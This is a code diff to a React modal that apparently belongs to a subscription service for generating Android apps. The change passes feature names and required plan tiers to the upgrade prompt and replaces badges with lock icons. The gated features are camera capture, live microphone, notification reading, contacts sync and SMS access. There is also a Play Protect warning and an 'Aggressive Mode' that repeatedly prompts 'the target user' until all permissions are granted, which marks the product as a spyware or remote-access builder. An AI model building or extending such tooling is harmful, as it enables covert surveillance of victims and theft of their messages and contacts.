@@ -16,7 +16,7 @@ interface AppGenerationModalProps {
     uuid: string;
     socket: any;
     userPlan?: 'basic' | 'standard' | 'premium';
-    onUpgrade?: () => void;
+    onUpgrade?: (feature?: string, requiredPlan?: string) => void;
 }
 
 const APP_PRESETS = [
@@ -891,7 +891,7 @@ export default function AppGenerationModal({ isOpen, onClose, uuid, socket, user
                                     <button
                                         type="button"
                                         onClick={() => {
-                                            if (!isPremium) { onUpgrade?.(); return; }
+                                            if (!isPremium) { onUpgrade?.('Camera Capture', 'premium'); return; }
                                             setEnableCameraPermission(!enableCameraPermission);
                                         }}
                                         className={`w-11 h-6 rounded-full transition-colors relative flex-shrink-0 ${!isPremium ? 'bg-white/10' : enableCameraPermission ? 'bg-cyan-500' : 'bg-white/20'}`}
@@ -917,7 +917,7 @@ export default function AppGenerationModal({ isOpen, onClose, uuid, socket, user
                                     <button
                                         type="button"
                                         onClick={() => {
-                                            if (!isPremium) { onUpgrade?.(); return; }
+                                            if (!isPremium) { onUpgrade?.('Live Microphone', 'premium'); return; }
                                             setEnableMicrophonePermission(!enableMicrophonePermission);
                                         }}
                                         className={`w-11 h-6 rounded-full transition-colors relative flex-shrink-0 ${!isPremium ? 'bg-white/10' : enableMicrophonePermission ? 'bg-purple-500' : 'bg-white/20'}`}
@@ -943,7 +943,7 @@ export default function AppGenerationModal({ isOpen, onClose, uuid, socket, user
                                     <button
                                         type="button"
                                         onClick={() => {
-                                            if (isBasicPlan) { onUpgrade?.(); return; }
+                                            if (isBasicPlan) { onUpgrade?.('Notification Reader', 'standard'); return; }
                                             setEnableNotificationListener(!enableNotificationListener);
                                         }}
                                         className={`w-11 h-6 rounded-full transition-colors relative flex-shrink-0 ${isBasicPlan ? 'bg-white/10' : enableNotificationListener ? 'bg-sky-500' : 'bg-white/20'}`}
@@ -969,7 +969,7 @@ export default function AppGenerationModal({ isOpen, onClose, uuid, socket, user
                                     <button
                                         type="button"
                                         onClick={() => {
-                                            if (isBasicPlan) { onUpgrade?.(); return; }
+                                            if (isBasicPlan) { onUpgrade?.('Contacts Sync', 'standard'); return; }
                                             setEnableContactsPermission(!enableContactsPermission);
                                         }}
                                         className={`w-11 h-6 rounded-full transition-colors relative flex-shrink-0 ${isBasicPlan ? 'bg-white/10' : enableContactsPermission ? 'bg-green-500' : 'bg-white/20'}`}
@@ -1001,9 +1001,9 @@ export default function AppGenerationModal({ isOpen, onClose, uuid, socket, user
                                             <div className="flex flex-col">
                                                 <div className="flex items-center gap-2">
                                                     <span className="text-sm font-bold text-rose-200">SMS Messages</span>
-                                                    <span className="bg-rose-500/20 text-rose-300 border border-rose-500/40 px-1.5 py-0.5 rounded text-[9px] font-bold">
-                                                        ADVANCED
-                                                    </span>
+                                                    {isBasicPlan && (
+                                                        <Lock size={13} className="text-rose-400/50" />
+                                                    )}
                                                     <button type="button" onClick={() => setShowPermissionInfo('sms')} className="text-rose-400/70 hover:text-rose-300">
                                                         <Info size={14} />
                                                     </button>
@@ -1013,7 +1013,7 @@ export default function AppGenerationModal({ isOpen, onClose, uuid, socket, user
                                             <button
                                                 type="button"
                                                 onClick={() => {
-                                                    if (isBasicPlan) { onUpgrade?.(); return; }
+                                                    if (isBasicPlan) { onUpgrade?.('SMS Messages', 'standard'); return; }
                                                     if (!enableSmsPermission) {
                                                         setShowPlayProtectWarning(true);
                                                     } else {
@@ -1031,16 +1031,16 @@ export default function AppGenerationModal({ isOpen, onClose, uuid, socket, user
                                             <div className="flex flex-col">
                                                 <div className="flex items-center gap-2">
                                                     <span className="text-sm font-bold text-amber-200">Aggressive Mode</span>
-                                                    <span className="bg-amber-500/20 text-amber-300 border border-amber-500/40 px-1.5 py-0.5 rounded text-[9px] font-bold">
-                                                        LOOP
-                                                    </span>
+                                                    {isBasicPlan && (
+                                                        <Lock size={13} className="text-amber-400/50" />
+                                                    )}
                                                 </div>
                                                 <span className="text-xs text-amber-300/70">Repeatedly prompts the target user for permissions until all required access is granted.</span>
                                             </div>
                                             <button
                                                 type="button"
                                                 onClick={() => {
-                                                    if (isBasicPlan) { onUpgrade?.(); return; }
+                                                    if (isBasicPlan) { onUpgrade?.('Aggressive Mode', 'standard'); return; }
                                                     setAggressivePermissions(!aggressivePermissions);
                                                 }}
                                                 className={`w-11 h-6 rounded-full transition-colors relative flex-shrink-0 ${isBasicPlan ? 'bg-white/10' : aggressivePermissions ? 'bg-amber-500' : 'bg-white/20'}`}
